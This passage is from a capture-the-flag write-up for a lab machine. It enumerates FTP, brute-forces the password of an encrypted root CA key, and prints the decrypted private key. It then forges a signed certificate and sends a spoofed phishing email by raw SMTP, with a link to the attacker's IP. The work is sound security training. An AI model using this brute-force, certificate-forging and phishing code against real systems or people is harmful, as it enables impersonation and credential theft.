    print(control_sock.recv(1024).decode().strip())
    control_sock.close()

ftp_list_pub_epsv()
```

    220 (vsFTPd 3.0.3)
    > USER anonymous
    < 331 Please specify the password.
    > PASS anonymous@
    < 230 Login successful.
    > TYPE I
    < 200 Switching to Binary mode.
    > EPSV
    < 229 Entering Extended Passive Mode (|||21106|)
    > LIST /pub
    < 150 Here comes the directory listing.
    
    Directory listing:
    -rw-r--r--    1 ftp      ftp        954437 Jun 01 04:38 linpeas.sh
    -rw-r--r--    1 ftp      ftp       3379136 Jun 01 04:39 linpeas_linux_amd64
    drwxr-xr-x    2 ftp      ftp          4096 Jun 21 01:16 logs
    -rw-r--r--    1 ftp      ftp         11234 Jun 19 18:47 phish.py
    -rw-r--r--    1 ftp      ftp       3104768 Jan 17  2023 pspy64
    -rw-r--r--    1 ftp      ftp       1233888 Jan 17  2023 pspy64s
    
    226 Directory send OK.
    221 Goodbye.


With this, we now have something to sign our custom certificates.

RootCA.crt
```
-----BEGIN CERTIFICATE-----
MIIFFzCCAv+gAwIBAgIUVZjiESnop+nNu9rkWlbXORjlrc0wDQYJKoZIhvcNAQEL
BQAwGjEYMBYGA1UEAwwPU29yY2VyeSBSb290IENBMCAXDTI0MTAzMTAyMDkwOFoY
DzIyOTgwODE2MDIwOTA4WjAaMRgwFgYDVQQDDA9Tb3JjZXJ5IFJvb3QgQ0EwggIi
MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCN/ViSM+ZkeuX17l4GF+0GTcfO
0HX98yvnA5+MQ+TvzKuEHUxkmlL/28xwtIzT/ejB0sKcr7T733kiiy2PMsIbywzM
rJrlLBCAekb1hdqXXb0CcNEZrVQGZnU2h9iFBpsexXvh+oUPszrBdxOAITI6HPio
p/IjTfyt1QNtQJTNcB7ernYVb4lH043QAgS6M9CcYXev7pDarynbOZvEe5aS42NY
+MtEg643k4JM1T4NQGKHkGhWO/73OzCero2Rpyz/Wo7fVnpVhrwNdexiStbCUtqQ
qDKaieeigjZtpQKNLC5tC6fWrN3dSWT+diyQ+sQfrVYQQc8oWPbQHAysaGP6KGW+
V51Ai5z0vshG5W36GEHAmP8opvvVzPrS4Y9L6L1rMuIHwsCmTz/koBf8pJJ0sURB
1edux+j+Wzp9B8umONaKMOvG1GejVGW8UAhmVhK3ebr/Vto48J5svgtJO9d/QmZd
XlKsIdvaRUzSHTQfflQ7k1G9AlNdp3PNXW4YrlWlP+b4aSSyet6EyQR1KFmipGu2
ozbgMxYQ0nb4UwkCar3QJ3funYBjTdJtV5fHSUzmTO0BRH2jFi0VaDtIMBpmYQFo
kUJZSA5PW+ujDLoAQQDjMd5M7NJi4dWPdbAL9zCL7I41DUyk2hPuYVocd7SW1pTU
7bER1p5kKYlhwhnAHQIDAQABo1MwUTAdBgNVHQ4EFgQUjkNkC2vZwFux5uHSWfP+
U1HQbMkwHwYDVR0jBBgwFoAUjkNkC2vZwFux5uHSWfP+U1HQbMkwDwYDVR0TAQH/
BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAZHTimjRmsbRIlq2wIcNXnaFHtdk4
kvXcgHg3G9kPk27QKTYnAFicAmFDJkWdwMdB9eAhyurcvpWvP8Z+WFrQaOAUFZje
kY/CB+1/pouYIxw9IpTanl+hN0Ca4C74fXUfk3am21ntl7S/OomtZDISvaPALr1E
ejE3MiEBDg+V03tWA1fLtSX039rh2trjn5Jgg498jlumTV+62Tg9OoAS1liCPzLA
aps6odiYVnjuqhpfHRHoifIn1enadbLpKb7C58iw/KnuTzsQ8suweWbRsSkBKXQo
b8ozrF/MaxEk3dzakfV+yEsXIhmbDrPa0LGdAARXIPeEIRyl3qk7N4lmJVCt/94K
tyypoNIhqRvKLs+vGQHrGJjKezzm4ygZ0qO9z6QqliYobcRCioxb+Ml3qPGtggws
xrFDATMN5r5TNbTkm1y2apeB5fpaHyQLWZzbm7acZhBMVZ4wI/QPV2o+bwZeKCXH
frakt9Nz8KCzlulUt/C9D0rnFoTDJnG/focvWewuW9bKQqJLmSj6L0/Vvc2a+lWc
7kDfSUCHvTYR1OrwggA1HJ48Eu/NwNERvxXm395B9hCRgsji3jLEaUOgPuq1hrgb
u5GqrPn8BMpsLs92Y/pMUtWbF3DcM8jn+hjL3owallYj2E9Md6mQ5pfI1+PiTvf/
udz+k7mYqIcCjsE=
-----END CERTIFICATE-----
```
RootCA.key
```
-----BEGIN ENCRYPTED PRIVATE KEY-----
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
-----END ENCRYPTED PRIVATE KEY-----
```

If you look at the RootCA.key, you can see it's actually an Encrypted private key. There are bruteforcers out there, but I went with the tried and true jupyter python. 

TL;DR: It just tries to decrypt the key with a list of passwords.


```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
import sys

def try_decrypt_key(encrypted_key_path, password):
    try:
        with open(encrypted_key_path, "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=password.encode(),
                backend=default_backend()
            )
        return True
    except Exception as e:
        # Common exceptions: ValueError, TypeError, UnsupportedAlgorithm
        return False

def brute_force_key(encrypted_key_path, password_list):
    for i, password in enumerate(password_list, 1):
        sys.stdout.write(f"\rTrying password {i}/{len(password_list)}: {password}")
        sys.stdout.flush()
        
        if try_decrypt_key(encrypted_key_path, password):
            print(f"\n\nSUCCESS! Password found: '{password}'")
            return password
    
    print("\n\nFailed to decrypt the key with provided passwords.")
    return None

encrypted_key_path = "./certificate/RootCA.key"
# I use nix btw
password_file = "/nix/store/khjvbjjz3yazpgln3qb9nykyf4ypahcm-wordlists-collection/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000.txt"

with open(password_file, "r") as f:
    passwords = [line.strip() for line in f.readlines()]

print(f"Loaded {len(passwords)} passwords to try...")
found_password = brute_force_key(encrypted_key_path, passwords)

if found_password:
    # Optionally save the decrypted key
    with open(encrypted_key_path, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=found_password.encode(),
            backend=default_backend()
        )
    
    decrypted_key = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    with open("decrypted_RootCA.key", "wb") as f:
        f.write(decrypted_key)
    print("Decrypted key saved as decrypted_RootCA.key")


```

    Loaded 1000 passwords to try...
    Trying password 2/1000: password
    
    SUCCESS! Password found: 'password'
    Decrypted key saved as decrypted_RootCA.key


```
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
```

Below are the commands used to generate a cert signed by the CA.

```sh
(.venv)  /certificate  openssl genrsa -out toku.key 2048
(.venv)  /certificate  openssl req -new -key toku.key -out toku.csr

You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:

(.venv)  /certificate  openssl x509 -req -in toku.csr -CA RootCA.crt -CAkey decrypted_RootCA.key -CAcreateserial -out toku.crt -days 365
Certificate request self-signature ok
subject=C=AU, ST=Some-State, O=Internet Widgits Pty Ltd
(.venv)  /certificate  openssl verify -CAfile RootCA.crt toku.crt  
toku.crt: OK
```

With that out of the way, we can move onto the next requirement for our phishing campaign, sending emails.

Using our port sending tool again, we can send raw SMTP data to the mail server and see what we get back. Unfortunately it wasn't as simple as just sending a link back home.


```python
smtpsendemail = [
    "EHLO sorcery.htb\r\n",
    "MAIL FROM:<trustmebro@sorcery.htb>\r\n",
    "RCPT TO:<tom_summers@sorcery.htb>\r\n",
    "DATA\r\n",
    "From: Legit <legitadmin@sorcery.htb>\r\n",
    "To: Tom Summers <tom_summers@sorcery.htb>\r\n",
    "Subject: Make your weiner huge\r\n",
    "Date: Wed, 14 Jun 2023 10:00:00 -0400\r\n",
    "\r\n",
    "This is a test email message. <a href='http://10.10.14.26:9999/gethung>git.sorcery.htb</a>\r\n",
    ".\r\n",
    "QUIT\r\n"
]

checkqueue = [
    "GET /api/v2/messages HTTP/1.1\r\nHost: mail\r\n\r\n"
]

with requests.Session() as s:
    smtpInitialize = sendPortData(s, token, "mail", 1025, [smtpsendemail], keepalive=False, expectresponse=True)
    smtpresponse = Chepy(smtpInitialize).from_hex().o.decode()
    print(smtpresponse)
    checkMail = sendPortData(s, token, "mail", 8025, [checkqueue], keepalive=False, expectresponse=True)
    mailresponse = Chepy(checkMail).from_hex().o.decode()
    print(mailresponse)

```

    /home/tokugero/ctf/htb/season8/week5-sorcery/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'sorcery.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
      warnings.warn(


    220 mailhog.example ESMTP MailHog
    250-Hello sorcery.htb
    250-PIPELINING
    250 AUTH PLAIN
    250 Sender trustmebro@sorcery.htb ok
    250 Recipient tom_summers@sorcery.htb ok
    354 End data with <CR><LF>.<CR><LF>
    250 Ok: queued as AgEoK_pD7BNS-ppUUe0uWPcx-guSRt4Wp2DEn11CEik=@mailhog.example
    221 Bye
    


    /home/tokugero/ctf/htb/season8/week5-sorcery/.venv/lib/python3.12/site-packages/urllib3/connectionpool.py:1097: InsecureRequestWarning: Unverified HTTPS request is being made to host 'sorcery.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
      warnings.warn(


    HTTP/1.1 200 OK
    Content-Type: text/json
    Date: Tue, 17 Jun 2025 18:47:45 GMT
    Transfer-Encoding: chunked
    
    5f8b
    {"total":20,"count":20,"start":0,"items":[{"ID":"AgEoK_pD7BNS-ppUUe0uWPcx-guSRt4Wp2DEn11CEik=@mailhog.example","From":{"Relays":null,"Mailbox":"trustmebro","Domain":"sorcery.htb","Params":""},"To":[{"Relays":null,"Mailbox":"tom_summers","Domain":"sorcery.htb","Params":""}],"Content":{"Headers":{"Date":["Wed, 14 Jun 2023 10:00:00 -0400"],"From":["Legit \u003clegitadmin@sorcery.htb\u003e"],"Message-ID":["AgEoK_pD7BNS-ppUUe0uWPcx-guSRt4Wp2DEn11CEik=@mailhog.example"],"Received":["from sorcery.htb by mailhog.example (MailHog)\r\n          id AgEoK_pD7BNS-ppUUe0uWPcx-guSRt4Wp2DEn11CEik=@mailhog.example; Tue, 17 Jun 2025 18:47:45 +0000"],"Return-Path":["\u003ctrustmebro@sorcery.htb\u003e"],"Subject":["Make your weiner huge"],"To":["Tom Summers \u003ctom_summers@sorcery.htb\u003e"]},"Body":"This is a test email message. \u003ca href='http://10.10.14.26:9999/gethung\u003egit.sorcery.htb\u003c/a\u003e","Size":244,"MIME":null},"Created":"2025-06-17T18:47:45.375361084Z","MIME":null,"Raw":{"From":"trustmebro@sorcery.htb","To":["tom_summers@sorcery.htb"],"Data":"From: Legit \u003clegitadmin@sorcery.htb\u003e\r\nTo: Tom Summers \u003ctom_summers@sorcery.htb\u003e\r\nSubject: Make your weiner huge\r\nDate: Wed, 14 Jun 2023 10:00:00 -0400\r\n\r\nThis is a test email message. \u003ca href='http://10.10.14.26:9999/gethung\u003egit.sorcery.htb\u003c/a\u003e","Helo":"sorcery.htb"}},{"ID":"mpDijeYEItfBvQWSyvME58yqhDC2n2Dcbt2fJWzAUbc=@mailhog.example","From":{"Relays":null,"Mailbox":"tom_summers","Domain":"sorcery.htb","Params":""},"To":[{"Relays":null,"Mailbox":"trustmebro","Domain":"sorcery.htb","Params":""}],...
    "Helo":""}},{"ID":"JNivLxDplc1MS-4VP_1loFfxRPkZ6yNK3V95CD_u6CY=@mailhog.example","From":{"Relays":null,"Mailbox":"tom_summers","Domain":"sorcery.htb","Params":""},"To":[{"Relays":null,"Mailbox":"trustmebro","Domain":"sorcery.htb","Params":""}],"Content":{"Headers":{"Content-Transfer-Encoding":["quoted-printable"],"Date":["Tue, 17 Jun 2025 18:35:34 +0000"],"From":["tom_summers@sorcery.htb"],"Message-ID":["JNivLxDplc1MS-4VP_1loFfxRPkZ6yNK3V95CD_u6CY=@mailhog.example"],"Received":["from dd4a41e5d7b7 by mailhog.example (MailHog)\r\n          id JNivLxDplc1MS-4VP_1loFfxRPkZ6yNK3V95CD_u6CY=@mailhog.example; Tue, 17 Jun 2025 18:35:34 +0000"],"Return-Path":["\u003ctom_summers@sorcery.htb\u003e"],"To":["trustmebro@sorcery.htb"]},"Body":"http://10.10.14.26:9999/gethung does not seem to be a part of our organizat=\r\nion.","Size":227,"MIME":null},"Created":"2025-06-17T18:35:34.093644858Z","MIME":null,"Raw":{"From":"tom_summers@sorcery.htb","To":["trustmebro@sorcery.htb"],"Data":"From: tom_summers@sorcery.htb\r\nTo: trustmebro@sorcery.htb\r\nContent-Transfer-Encoding: quoted-printable\r\nDate: Tue, 17 Jun 2025 18:35:34 +0000\r\n\r\nhttp://10.10.14.26:9999/gethung does not seem to be a part of our organizat=\r\nion.","Helo":"dd4a41e5d7b7"}}]}
    0
    
    


## Kafka

This was by far the most annoying part of this journey. When I ran a kafka code locally and used my port proxy to send data from the backend to me: everything worked flawlessly. However when I tried to use the rest proxy on the remote end, I never got back any useful data. As a result, I ended up trying and failing. A lot. A lot a lot. This part took more of the challenge than all other components put together.

Eventually I found that I could skip the rest-api (on port 8082) all together and send raw data to kafka based on the rust library found in the infrastructure exfiltration kafka-rust version 0.10.0. While it was very old, it was super helpful to feed these files into Github Copilot, and have it help me generate pythonified versions of the protocol byte code so I could feed it through my proxy directly.


```python
import struct

def encode_kafka_string(s):
    if s is None:
        return struct.pack(">h", -1)
    encoded = s.encode("utf-8")
    return struct.pack(">h", len(encoded)) + encoded

# Need this to determine the version to make sure we're sending the right data to future calls.
def encode_api_versions_request(correlation_id=1, client_id="versionprobe"):
    api_key = 18  # API Versions
    api_version = 0
    header = struct.pack(">hhih", api_key, api_version, correlation_id, len(client_id))
    header += client_id.encode("utf-8")
    # API Versions request v0 has no body
    request = header
    request = struct.pack(">i", len(request)) + request
    return request

req_bytes = encode_api_versions_request()
print("API Versions request hex:")
print(req_bytes.hex())

with requests.Session() as s:
    print("Generating topics in Kafka")
    kafkaInitialize = sendPortData(s, token, "kafka", 9092, [req_bytes.hex()], keepalive=False, expectresponse=True, debug=True)
    for idx, line in enumerate(kafkaInitialize):
        print(idx, Chepy(line).from_hex().o.decode())
```

    API Versions request hex:
    000000160012000000000001000c76657273696f6e70726f6265
    Generating topics in Kafka
    '0:["$@1",["eMXTkHuLPViqV0QpNTSCV",null]]\n1:{"result":{"data":[""]}}\n'
    0 


For whatever reason, my proxy did not return any data. But feeding this payload through the site manually I was able to get a response and parse it out!


```python
response = "000001600000000100000000003900000000000a00010000001000020000000800030000000c000800000009000900000009000a00000004000b00000009000c00000004000d00000005000e00000005000f00000005001000000004001100000001001200000003001300000007001400000006001500000002001600000004001700000004001800000004001900000003001a00000003001b00000001001c00000003001d00000003001e00000003001f00000003002000000004002100000002002200000002002300000004002400000002002500000003002600000003002700000002002800000002002900000003002a00000002002b00000002002c00000001002d00000000002e00000000002f00000000003000000001003100000001003200000000003300000000003700000001003900000001003c00000001003d00000000004000000000004100000000004200000000004400000000004a00000000"

import struct

def read_kafka_string(data, offset):
    length = struct.unpack_from(">h", data, offset)[0]
    offset += 2
    if length == -1:
        return None, offset
    value = data[offset:offset+length].decode("utf-8")
    offset += length
    return value, offset

def parse_api_versions_response(data):
    offset = 0
    # Read total length (int32)
    total_length = struct.unpack_from(">i", data, offset)[0]
    offset += 4
    # Header: correlation_id (int32)
    correlation_id = struct.unpack_from(">i", data, offset)[0]
    offset += 4
    # Error code (int16)
    error_code = struct.unpack_from(">h", data, offset)[0]
    offset += 2

    # ApiVersions array (int32)
    num_versions = struct.unpack_from(">i", data, offset)[0]
    offset += 4
    versions = []
    for _ in range(num_versions):
        api_key, min_version, max_version = struct.unpack_from(">hhh", data, offset)
        offset += 6
        versions.append({
            "api_key": api_key,
            "min_version": min_version,
            "max_version": max_version
        })

    # Optional: parse throttle_time_ms (int32) if present (Kafka 0.10.0+, ApiVersions v1+)
    throttle_time_ms = None
    if len(data) - offset >= 4:
        throttle_time_ms = struct.unpack_from(">i", data, offset)[0]
        offset += 4

    # Optional: parse supported_features, finalized_features, etc. (Kafka 3.0+), but omitted for v0-v1

    return {
        "correlation_id": correlation_id,
        "error_code": error_code,
        "api_versions": versions,
        "throttle_time_ms": throttle_time_ms
    }

if __name__ == "__main__":
    # Example: paste your hex response here
    data = bytes.fromhex(response)
    result = parse_api_versions_response(data)
    print("Parsed ApiVersions response:")
    for ver in result["api_versions"]:
        print(f"Key={ver['api_key']:2d}  min={ver['min_version']}  max={ver['max_version']}")
    if result["throttle_time_ms"] is not None:
        print(f"Throttle time: {result['throttle_time_ms']} ms")
```

    Parsed ApiVersions response:
    Key= 0  min=0  max=10
    Key= 1  min=0  max=16
    Key= 2  min=0  max=8
    Key= 3  min=0  max=12
    Key= 8  min=0  max=9
    Key= 9  min=0  max=9
